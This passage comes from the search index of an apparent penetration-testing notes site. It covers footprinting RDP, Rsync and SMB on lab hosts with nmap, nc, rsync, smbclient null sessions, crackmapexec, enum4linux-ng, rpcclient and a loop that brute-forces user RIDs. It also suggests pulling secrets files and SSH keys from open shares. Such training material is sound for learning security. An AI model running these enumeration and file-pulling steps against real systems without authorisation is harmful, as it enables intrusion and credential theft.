ILF-SQL-01\n        Thumbprint:  b7:5f:00:ca:91:00:0a:29:0c:b5:14:21:f3:b0:ca:9e:af:8c:62:d6:dc:f9:50:ec:ac:06:38:1f:c5:d6:a9:39\nThe above X.509 certificate could not be verified, possibly because you do not have\nthe CA certificate in your certificate store, or the certificate has expired.\nPlease look at the OpenSSL documentation on how to add a private CA to the store.\n\n\nDo you trust the above certificate? (Y/T/N) y\n\n[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] - VERSION ={\n[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductMajorVersion: 6\n[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductMinorVersion: 1\n[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductBuild: 7601\n[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      Reserved: 0x000000\n</code></pre> <p>After successful authentication, a new window will appear with access to the server's desktop to which we have connected.</p>","tags":["Pentesting","Information_Gathering","RDP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/RDP%20%283389%29/Overview/","title":"Overview","text":"<p>The Remote Desktop Protocol (<code>RDP</code>) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration.</p> <p>For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside. If Network Address Translation (<code>NAT</code>) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. In addition, port forwarding must be set up on the NAT router in the direction of the server.</p> <p>RDP has handled Transport Layer Security (<code>TLS/SSL</code>) since Windows Vista, which means that all data, and especially the login process, is protected in the network by its good encryption. However, many Windows systems do not insist on this but still accept inadequate encryption via RDP Security. Nevertheless, even with this, an attacker is still far from being locked out because the identity-providing certificates are merely self-signed by default. This means that the client cannot distinguish a genuine certificate from a forged one and generates a certificate warning for the user.</p> <p>The <code>Remote Desktop</code> service is installed by default on Windows servers and does not require additional external applications. This service can be activated using the <code>Server Manager</code> and comes with the default setting to allow connections to the service only to hosts with Network level authentication (<code>NLA</code>).</p>","tags":["Pentesting","Information_Gathering","RDP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/RSYNC%20%28873%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"","tags":["Pentesting","Information_Gathering","RSYNC"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/RSYNC%20%28873%29/Footprinting%20the%20Service/#scanning-for-rsync","title":"Scanning for Rsync","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap -sV -p 873 127.0.0.1\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 09:31 EDT\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.0058s latency).\n\nPORT    STATE SERVICE VERSION\n873/tcp open  rsync   (protocol version 31)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1.13 seconds\n</code></pre>","tags":["Pentesting","Information_Gathering","RSYNC"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/RSYNC%20%28873%29/Footprinting%20the%20Service/#probing-for-accessible-shares","title":"Probing for Accessible Shares","text":"<p>We can next probe the service a bit to see what we can gain access to.</p> <pre><code>arenwald@htb[/htb]$ nc -nv 127.0.0.1 873\n\n(UNKNOWN) [127.0.0.1] 873 (rsync) open\n@RSYNCD: 31.0\n@RSYNCD: 31.0\n#list\ndev             Dev Tools\n@RSYNCD: EXIT\n</code></pre>","tags":["Pentesting","Information_Gathering","RSYNC"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/RSYNC%20%28873%29/Footprinting%20the%20Service/#enumerating-an-open-share","title":"Enumerating an Open Share","text":"<p>Here we can see a share called <code>dev</code>, and we can enumerate it further.</p> <pre><code>arenwald@htb[/htb]$ rsync -av --list-only rsync://127.0.0.1/dev\n\nreceiving incremental file list\ndrwxr-xr-x             48 2022/09/19 09:43:10 .\n-rw-r--r--              0 2022/09/19 09:34:50 build.sh\n-rw-r--r--              0 2022/09/19 09:36:02 secrets.yaml\ndrwx------             54 2022/09/19 09:43:10 .ssh\n\nsent 25 bytes  received 221 bytes  492.00 bytes/sec\ntotal size is 0  speedup is 0.00\n</code></pre> <p>From the above output, we can see a few interesting files that may be worth pulling down to investigate further. We can also see that a directory likely containing SSH keys is accessible. From here, we could sync all files to our attack host with the command <code>rsync -av rsync://127.0.0.1/dev</code>. If Rsync is configured to use SSH to transfer files, we could modify our commands to include the <code>-e ssh</code> flag, or <code>-e \"ssh -p2222\"</code> if a non-standard port is in use for SSH. This guide is helpful for understanding the syntax for using Rsync over SSH.</p>","tags":["Pentesting","Information_Gathering","RSYNC"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/RSYNC%20%28873%29/Overview/","title":"Overview","text":"<p>Rsync is a fast and efficient tool for locally and remotely copying files. It can be used to copy files locally on a given machine and to/from remote hosts. It is highly versatile and well-known for its delta-transfer algorithm. This algorithm reduces the amount of data transmitted over the network when a version of the file already exists on the destination host. It does this by sending only the differences between the source files and the older version of the files that reside on the destination server. It is often used for backups and mirroring. It finds files that need to be transferred by looking at files that have changed in size or the last modified time. By default, it uses port <code>873</code> and can be configured to use SSH for secure file transfers by piggybacking on top of an established SSH server connection.</p> <p>This guide covers some of the ways Rsync can be abused, most notably by listing the contents of a shared folder on a target server and retrieving files. This can sometimes be done without authentication. Other times we will need credentials. If you find credentials during a pentest and run into Rsync on an internal (or external) host, it is always worth checking for password re-use as you may be able to pull down some sensitive files that could be used to gain remote access to the target.</p> <p>Let's do a bit of quick footprinting. We can see that Rsync is in use using protocol 31.</p>","tags":["Pentesting","Information_Gathering","RSYNC"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Cheat%20Sheet/","title":"Cheat Sheet","text":"Command Description <code>smbclient -N -L //&lt;FQDN/IP&gt;</code> Null session authentication on SMB. <code>smbclient //&lt;FQDN/IP&gt;/&lt;share&gt;</code> Connect to a specific SMB share. <code>rpcclient -U \"\" &lt;FQDN/IP&gt;</code> Interaction with the target using RPC. <code>samrdump.py &lt;FQDN/IP&gt;</code> Username enumeration using Impacket scripts. <code>smbmap -H &lt;FQDN/IP&gt;</code> Enumerating SMB shares. <code>crackmapexec smb &lt;FQDN/IP&gt; --shares -u '' -p ''</code> Enumerating SMB shares using null session authentication. <code>enum4linux-ng.py &lt;FQDN/IP&gt; -A</code> SMB enumeration using enum4linux.","tags":["Pentesting","Information_Gathering","Cheat_Sheet","SMB"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Dangerous%20Settings/","title":"Dangerous Settings","text":"<p>Some of the above settings already bring some sensitive options. However, suppose we question the settings listed below and ask ourselves what the employees could gain from them, as well as attackers. In that case, we will see what advantages and disadvantages the settings bring with them. Let us take the setting <code>browseable = yes</code> as an example. If we as administrators adopt this setting, the company's employees will have the comfort of being able to look at the individual folders with the contents. Many folders are eventually used for better organization and structure. If the employee can browse through the shares, the attacker will also be able to do so after successful access.</p> Setting Description <code>browseable = yes</code> Allow listing available shares in the current share? <code>read only = no</code> Forbid the creation and modification of files? <code>writable = yes</code> Allow users to create and modify files? <code>guest ok = yes</code> Allow connecting to the service without using a password? <code>enable privileges = yes</code> Honor privileges assigned to specific SID? <code>create mask = 0777</code> What permissions must be assigned to the newly created files? <code>directory mask = 0777</code> What permissions must be assigned to the newly created directories? <code>logon script = script.sh</code> What script needs to be executed on the user's login? <code>magic script = script.sh</code> Which script should be executed when the script gets closed? <code>magic output = script.out</code> Where the output of the magic script needs to be stored? Let us create a share called <code>[notes]</code> and a few others and see how the settings affect our enumeration process. We will use all of the above settings and apply them to this share. For example, this setting is often applied, if only for testing purposes. If it is then an internal subnet of a small team in a large department, this setting is often retained or forgotten to be reset. This leads to the fact that we can browse through all the shares and, with high probability, even download and inspect them.","tags":["Pentesting","Information_Gathering","SMB"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Dangerous%20Settings/#example-share","title":"Example Share","text":"<pre><code>...SNIP...\n\n[notes]\n    comment = CheckIT\n    path = /mnt/notes/\n\n    browseable = yes\n    read only = no\n    writable = yes\n    guest ok = yes\n\n    enable privileges = yes\n    create mask = 0777\n    directory mask = 0777\n</code></pre> <p>It is highly recommended to look at the man pages for Samba and configure it ourselves and experiment with the settings. We will then discover potential aspects that will be interesting for us as a penetration tester. In addition, the more familiar we become with the Samba server and SMB, the easier it will be to find our way around the environment and use it for our purposes. Once we have adjusted <code>/etc/samba/smb.conf</code> to our needs, we have to restart the service on the server.</p>","tags":["Pentesting","Information_Gathering","SMB"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Dangerous%20Settings/#restart-samba","title":"Restart Samba","text":"<pre><code>root@samba:~# sudo systemctl restart smbd\n</code></pre> <p>Now we can display a list (<code>-L</code>) of the server's shares with the <code>smbclient</code> command from our host. We use the so-called <code>null session</code> (<code>-N</code>), which is <code>anonymous</code> access without the input of existing users or valid passwords.</p>","tags":["Pentesting","Information_Gathering","SMB"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Dangerous%20Settings/#smbclient-connecting-to-the-share","title":"SMBclient - Connecting to the Share","text":"<pre><code>arenwald@htb[/htb]$ smbclient -N -L //10.129.14.128\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        home            Disk      INFREIGHT Samba\n        dev             Disk      DEVenv\n        notes           Disk      CheckIT\n        IPC$            IPC       IPC Service (DEVSM)\nSMB1 disabled -- no workgroup available\n</code></pre> <p>We can see that we now have five different shares on the Samba server from the result. Thereby <code>print$</code> and an <code>IPC$</code> are already included by default in the basic setting, as we have already seen. Since we deal with the <code>[notes]</code> share, let us log in and inspect it using the same client program. If we are not familiar with the client program, we can use the <code>help</code> command on successful login, listing all the possible commands we can execute.</p> <pre><code>arenwald@htb[/htb]$ smbclient //10.129.14.128/notes\n\nEnter WORKGROUP\\&lt;username&gt;'s password: \nAnonymous login successful\nTry \"help\" to get a list of possible commands.\n\n\nsmb: \\&gt; help\n\n?              allinfo        altname        archive        backup         \nblocksize      cancel         case_sensitive cd             chmod          \nchown          close          del            deltree        dir            \ndu             echo           exit           get            getfacl        \ngeteas         hardlink       help           history        iosize         \nlcd            link           lock           lowercase      ls             \nl              mask           md             mget           mkdir          \nmore           mput           newer          notify         open           \nposix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    \nposix_unlink   posix_whoami   print          prompt         put            \npwd            q              queue          quit           readlink       \nrd             recurse        reget          rename         reput          \nrm             rmdir          showacls       setea          setmode        \nscopy          stat           symlink        tar            tarmode        \ntimeout        translate      unlock         volume         vuid           \nwdel           logon          listconnect    showconnect    tcon           \ntdis           tid            utimes         logoff         ..             \n!            \n\n\nsmb: \\&gt; ls\n\n  .                                   D        0  Wed Sep 22 18:17:51 2021\n  ..                                  D        0  Wed Sep 22 12:03:59 2021\n  prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021\n\n                30313412 blocks of size 1024. 16480084 blocks available\n</code></pre> <p>Once we have discovered interesting files or folders, we can download them using the <code>get</code> command. Smbclient also allows us to execute local system commands using an exclamation mark at the beginning (<code>!&lt;cmd&gt;</code>) without interrupting the connection.</p>","tags":["Pentesting","Information_Gathering","SMB"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Dangerous%20Settings/#download-files-from-smb","title":"Download Files from SMB","text":"<pre><code>smb: \\&gt; get prep-prod.txt \n\ngetting file \\prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) \n(average 8,7 KiloBytes/sec)\n\n\nsmb: \\&gt; !ls\n\nprep-prod.txt\n\n\nsmb: \\&gt; !cat prep-prod.txt\n\n[] check your code with the templates\n[] run code-assessment.py\n[] \u2026    \n</code></pre> <p>From the administrative point of view, we can check these connections using <code>smbstatus</code>. Apart from the Samba version, we can also see who, from which host, and which share the client is connected. This is especially important once we have entered a subnet (perhaps even an isolated one) that the others can still access.</p> <p>For example, with domain-level security, the samba server acts as a member of a Windows domain. Each domain has at least one domain controller, usually a Windows NT server providing password authentication. This domain controller provides the workgroup with a definitive password server. The domain controllers keep track of users and passwords in their own <code>NTDS.dit</code> and <code>Security Authentication Module</code> (<code>SAM</code>) and authenticate each user when they log in for the first time and wish to access another machine's share.</p>","tags":["Pentesting","Information_Gathering","SMB"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Dangerous%20Settings/#samba-status","title":"Samba Status","text":"<pre><code>root@samba:~# smbstatus\n\nSamba version 4.11.6-Ubuntu\nPID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              \n----------------------------------------------------------------------------------------------------------------------------------------\n75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)      SMB3_11           -                    -                    \n\nService      pid     Machine       Connected at                     Encryption   Signing     \n---------------------------------------------------------------------------------------------\nnotes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -           \n\nNo locked files\n</code></pre>","tags":["Pentesting","Information_Gathering","SMB"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/SMB%20vs%20CIFS/","title":"SMB vs CIFS","text":"<p>CIFS is a \"dialect\" of SMB. In other words, CIFS is a very specific implementation of the SMB protocol, which in turn was created by Microsoft. This allows Samba to communicate with newer Windows systems. Therefore, it usually is referred to as <code>SMB / CIFS</code>. However, CIFS is the extension of the SMB protocol. So when we pass SMB commands over Samba to an older NetBIOS service, it usually connects to the Samba server over TCP ports <code>137</code>, <code>138</code>, <code>139</code>, but CIFS uses TCP port <code>445</code> only. There are several versions of SMB, including outdated versions that are still used in specific infrastructures.</p> SMB Version Supported Features CIFS Windows NT 4.0 Communication via NetBIOS interface SMB 1.0 Windows 2000 Direct connection via TCP SMB 2.0 Windows Vista, Windows Server 2008 Performance upgrades, improved message signing, caching feature SMB 2.1 Windows 7, Windows Server 2008 R2 Locking mechanisms SMB 3.0 Windows 8, Windows Server 2012 Multichannel connections, end-to-end encryption, remote storage access SMB 3.0.2 Windows 8.1, Windows Server 2012 R2 SMB 3.1.1 Windows 10, Windows Server 2016 Integrity checking, AES-128 encryption","tags":["Pentesting","Information_Gathering","SMB"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Tools/Crackmapexec/","title":"Crackmapexec","text":"<pre><code>arenwald@htb[/htb]$ crackmapexec smb 10.129.14.128 --shares -u '' -p ''\n\nSMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)\nSMB         10.129.14.128   445    DEVSMB           [+] \\: \nSMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares\nSMB         10.129.14.128   445    DEVSMB           Share           Permissions     Remark\nSMB         10.129.14.128   445    DEVSMB           -----           -----------     ------\nSMB         10.129.14.128   445    DEVSMB           print$                          Printer Drivers\nSMB         10.129.14.128   445    DEVSMB           home                            INFREIGHT Samba\nSMB         10.129.14.128   445    DEVSMB           dev                             DEVenv\nSMB         10.129.14.128   445    DEVSMB           notes           READ,WRITE      CheckIT\nSMB         10.129.14.128   445    DEVSMB           IPC$                            IPC Service (DEVSM)\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","SMB","Crackmapexec"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Tools/Enum4Linux/","title":"Enum4Linux","text":"","tags":["Pentesting","Information_Gathering","Tools","SMB","Enum4Linux"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Tools/Enum4Linux/#enum4linux-ng-installation","title":"Enum4Linux-ng - Installation","text":"<pre><code>arenwald@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git\narenwald@htb[/htb]$ cd enum4linux-ng\narenwald@htb[/htb]$ pip3 install -r requirements.txt\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","SMB","Enum4Linux"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Tools/Enum4Linux/#enum4linux-ng-enumeration","title":"Enum4Linux-ng - Enumeration","text":"<pre><code>arenwald@htb[/htb]$ ./enum4linux-ng.py 10.129.14.128 -A\n\nENUM4LINUX - next generation\n\n ==========================\n|    Target Information    |\n ==========================\n[*] Target ........... 10.129.14.128\n[*] Username ......... ''\n[*] Random Username .. 'juzgtcsu'\n[*] Password ......... ''\n[*] Timeout .......... 5 second(s)\n\n =====================================\n|    Service Scan on 10.129.14.128    |\n =====================================\n[*] Checking LDAP\n[-] Could not connect to LDAP on 389/tcp: connection refused\n[*] Checking LDAPS\n[-] Could not connect to LDAPS on 636/tcp: connection refused\n[*] Checking SMB\n[+] SMB is accessible on 445/tcp\n[*] Checking SMB over NetBIOS\n[+] SMB over NetBIOS is accessible on 139/tcp\n\n =====================================================\n|    NetBIOS Names and Workgroup for 10.129.14.128    |\n =====================================================\n[+] Got domain/workgroup name: DEVOPS\n[+] Full NetBIOS names information:\n- DEVSMB          &lt;00&gt; -         H &lt;ACTIVE&gt;  Workstation Service\n- DEVSMB          &lt;03&gt; -         H &lt;ACTIVE&gt;  Messenger Service\n- DEVSMB          &lt;20&gt; -         H &lt;ACTIVE&gt;  File Server Service\n- ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; H &lt;ACTIVE&gt;  Master Browser\n- DEVOPS          &lt;00&gt; - &lt;GROUP&gt; H &lt;ACTIVE&gt;  Domain/Workgroup Name\n- DEVOPS          &lt;1d&gt; -         H &lt;ACTIVE&gt;  Master Browser\n- DEVOPS          &lt;1e&gt; - &lt;GROUP&gt; H &lt;ACTIVE&gt;  Browser Service Elections\n- MAC Address = 00-00-00-00-00-00\n\n ==========================================\n|    SMB Dialect Check on 10.129.14.128    |\n ==========================================\n[*] Trying on 445/tcp\n[+] Supported dialects and settings:\nSMB 1.0: false\nSMB 2.02: true\nSMB 2.1: true\nSMB 3.0: true\nSMB1 only: false\nPreferred dialect: SMB 3.0\nSMB signing required: false\n\n ==========================================\n|    RPC Session Check on 10.129.14.128    |\n ==========================================\n[*] Check for null session\n[+] Server allows session using username '', password ''\n[*] Check for random user session\n[+] Server allows session using username 'juzgtcsu', password ''\n[H] Rerunning enumeration with user 'juzgtcsu' might give more results\n\n ====================================================\n|    Domain Information via RPC for 10.129.14.128    |\n ====================================================\n[+] Domain: DEVOPS\n[+] SID: NULL SID\n[+] Host is part of a workgroup (not a domain)\n\n ============================================================\n|    Domain Information via SMB session for 10.129.14.128    |\n ============================================================\n[*] Enumerating via unauthenticated SMB session on 445/tcp\n[+] Found domain information via SMB\nNetBIOS computer name: DEVSMB\nNetBIOS domain name: ''\nDNS domain: ''\nFQDN: htb\n\n ================================================\n|    OS Information via RPC for 10.129.14.128    |\n ================================================\n[*] Enumerating via unauthenticated SMB session on 445/tcp\n[+] Found OS information via SMB\n[*] Enumerating via 'srvinfo'\n[+] Found OS information via 'srvinfo'\n[+] After merging OS information we have the following result:\nOS: Windows 7, Windows Server 2008 R2\nOS version: '6.1'\nOS release: ''\nOS build: '0'\nNative OS: not supported\nNative LAN manager: not supported\nPlatform id: '500'\nServer type: '0x809a03'\nServer type string: Wk Sv PrQ Unx NT SNT DEVSM\n\n ======================================\n|    Users via RPC on 10.129.14.128    |\n ======================================\n[*] Enumerating users via 'querydispinfo'\n[+] Found 2 users via 'querydispinfo'\n[*] Enumerating users via 'enumdomusers'\n[+] Found 2 users via 'enumdomusers'\n[+] After merging user results we have 2 users total:\n'1000':\n  username: mrb3n\n  name: ''\n  acb: '0x00000010'\n  description: ''\n'1001':\n  username: cry0l1t3\n  name: cry0l1t3\n  acb: '0x00000014'\n  description: ''\n\n =======================================\n|    Groups via RPC on 10.129.14.128    |\n =======================================\n[*] Enumerating local groups\n[+] Found 0 group(s) via 'enumalsgroups domain'\n[*] Enumerating builtin groups\n[+] Found 0 group(s) via 'enumalsgroups builtin'\n[*] Enumerating domain groups\n[+] Found 0 group(s) via 'enumdomgroups'\n\n =======================================\n|    Shares via RPC on 10.129.14.128    |\n =======================================\n[*] Enumerating shares\n[+] Found 5 share(s):\nIPC$:\n  comment: IPC Service (DEVSM)\n  type: IPC\ndev:\n  comment: DEVenv\n  type: Disk\nhome:\n  comment: INFREIGHT Samba\n  type: Disk\nnotes:\n  comment: CheckIT\n  type: Disk\nprint$:\n  comment: Printer Drivers\n  type: Disk\n[*] Testing share IPC$\n[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND\n[*] Testing share dev\n[-] Share doesn't exist\n[*] Testing share home\n[+] Mapping: OK, Listing: OK\n[*] Testing share notes\n[+] Mapping: OK, Listing: OK\n[*] Testing share print$\n[+] Mapping: DENIED, Listing: N/A\n\n ==========================================\n|    Policies via RPC for 10.129.14.128    |\n ==========================================\n[*] Trying port 445/tcp\n[+] Found policy:\ndomain_password_information:\n  pw_history_length: None\n  min_pw_length: 5\n  min_pw_age: none\n  max_pw_age: 49710 days 6 hours 21 minutes\n  pw_properties:\n  - DOMAIN_PASSWORD_COMPLEX: false\n  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false\n  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false\n  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false\n  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false\n  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false\ndomain_lockout_information:\n  lockout_observation_window: 30 minutes\n  lockout_duration: 30 minutes\n  lockout_threshold: None\ndomain_logoff_information:\n  force_logoff_time: 49710 days 6 hours 21 minutes\n\n ==========================================\n|    Printers via RPC for 10.129.14.128    |\n ==========================================\n[+] No printers returned (this is not an error)\n\nCompleted after 0.61 seconds\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","SMB","Enum4Linux"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Tools/RPCclient/","title":"RPCclient","text":"<p>The <code>rpcclient</code> offers us many different requests with which we can execute specific functions on the SMB server to get information. A complete list of all these functions can be found on the man page of the rpcclient.</p> Query Description <code>srvinfo</code> Server information. <code>enumdomains</code> Enumerate all domains that are deployed in the network. <code>querydominfo</code> Provides domain, server, and user information of deployed domains. <code>netshareenumall</code> Enumerates all available shares. <code>netsharegetinfo &lt;share&gt;</code> Provides information about a specific share. <code>enumdomusers</code> Enumerates all domain users. <code>queryuser &lt;RID&gt;</code> Provides information about a specific user. #### RPCclient - Enumeration <pre><code>rpcclient $&gt; srvinfo\n\n        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM\n        platform_id     :       500\n        os version      :       6.1\n        server type     :       0x809a03\n\n\nrpcclient $&gt; enumdomains\n\nname:[DEVSMB] idx:[0x0]\nname:[Builtin] idx:[0x1]\n\n\nrpcclient $&gt; querydominfo\n\nDomain:         DEVOPS\nServer:         DEVSMB\nComment:        DEVSM\nTotal Users:    2\nTotal Groups:   0\nTotal Aliases:  0\nSequence No:    1632361158\nForce Logoff:   -1\nDomain Server State:    0x1\nServer Role:    ROLE_DOMAIN_PDC\nUnknown 3:      0x1\n\n\nrpcclient $&gt; netshareenumall\n\nnetname: print$\n        remark: Printer Drivers\n        path:   C:\\var\\lib\\samba\\printers\n        password:\nnetname: home\n        remark: INFREIGHT Samba\n        path:   C:\\home\\\n        password:\nnetname: dev\n        remark: DEVenv\n        path:   C:\\home\\sambauser\\dev\\\n        password:\nnetname: notes\n        remark: CheckIT\n        path:   C:\\mnt\\notes\\\n        password:\nnetname: IPC$\n        remark: IPC Service (DEVSM)\n        path:   C:\\tmp\n        password:\n\n\nrpcclient $&gt; netsharegetinfo notes\n\nnetname: notes\n        remark: CheckIT\n        path:   C:\\mnt\\notes\\\n        password:\n        type:   0x0\n        perms:  0\n        max_uses:       -1\n        num_uses:       1\nrevision: 1\ntype: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE \nDACL\n        ACL     Num ACEs:       1       revision:       2\n        ---\n        ACE\n                type: ACCESS ALLOWED (0) flags: 0x00 \n                Specific bits: 0x1ff\n                Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS \n                SID: S-1-1-0\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","SMB","RPCclient"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Tools/RPCclient/#rpcclient-user-enumeration","title":"Rpcclient - User Enumeration","text":"<pre><code>rpcclient $&gt; enumdomusers\n\nuser:[mrb3n] rid:[0x3e8]\nuser:[cry0l1t3] rid:[0x3e9]\n\n\nrpcclient $&gt; queryuser 0x3e9\n\n        User Name   :   cry0l1t3\n        Full Name   :   cry0l1t3\n        Home Drive  :   \\\\devsmb\\cry0l1t3\n        Dir Drive   :\n        Profile Path:   \\\\devsmb\\cry0l1t3\\profile\n        Logon Script:\n        Description :\n        Workstations:\n        Comment     :\n        Remote Dial :\n        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET\n        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET\n        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET\n        Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST\n        Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST\n        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST\n        unknown_2[0..31]...\n        user_rid :      0x3e9\n        group_rid:      0x201\n        acb_info :      0x00000014\n        fields_present: 0x00ffffff\n        logon_divs:     168\n        bad_password_count:     0x00000000\n        logon_count:    0x00000000\n        padding1[0..7]...\n        logon_hrs[0..21]...\n\n\nrpcclient $&gt; queryuser 0x3e8\n\n        User Name   :   mrb3n\n        Full Name   :\n        Home Drive  :   \\\\devsmb\\mrb3n\n        Dir Drive   :\n        Profile Path:   \\\\devsmb\\mrb3n\\profile\n        Logon Script:\n        Description :\n        Workstations:\n        Comment     :\n        Remote Dial :\n        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET\n        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET\n        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET\n        Password last set Time   :      Mi, 22 Sep 2021 17:47:59 CEST\n        Password can change Time :      Mi, 22 Sep 2021 17:47:59 CEST\n        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST\n        unknown_2[0..31]...\n        user_rid :      0x3e8\n        group_rid:      0x201\n        acb_info :      0x00000010\n        fields_present: 0x00ffffff\n        logon_divs:     168\n        bad_password_count:     0x00000000\n        logon_count:    0x00000000\n        padding1[0..7]...\n        logon_hrs[0..21]...\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","SMB","RPCclient"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Tools/RPCclient/#rpcclient-group-information","title":"Rpcclient - Group Information","text":"<pre><code>rpcclient $&gt; querygroup 0x201\n\n        Group Name:     None\n        Description:    Ordinary Users\n        Group Attribute:7\n        Num Members:2\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","SMB","RPCclient"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Tools/RPCclient/#brute-forcing-user-rids","title":"Brute Forcing User RIDs","text":"<pre><code>arenwald@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U \"\" 10.129.14.128 -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" &amp;&amp; echo \"\";done\n\n        User Name   :   sambauser\n        user_rid :      0x1f5\n        group_rid:      0x201\n\n        User Name   :   mrb3n\n        user_rid :      0x3e8\n        group_rid:      0x201\n\n        User Name   :   cry0l1t3\n        user_rid :      0x3e9\n        group_rid:      0x201\n</code></pre>","tags":["Pentesting","Information_Gathering","Tools","SMB","RPCclient"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Tools/SMBMap/","title":"SMBMap","text":"","tags":["Pentesting","Information_Gathering","Tools","SMB","SMBMap"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/SMB%20%28139%2C445%29/Tools/SMBMap/#smbmap","title":"SMBmap","text":"<pre><code>arenwald@htb[/htb]$ smbmap -H 10.129.14.128\n\n[+] Finding open SMB ports....\n[+] User SMB session established on 10.129.14.128...\n[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        print$                                                  NO ACCESS       Printer Drivers\n        home                                                    NO ACCESS       INFREIGHT Samba\n        dev                                                     NO ACCESS       DEVenv\n        notes                                                   NO ACCESS       CheckIT\n        IPC$                                                    NO ACCESS       IPC Service 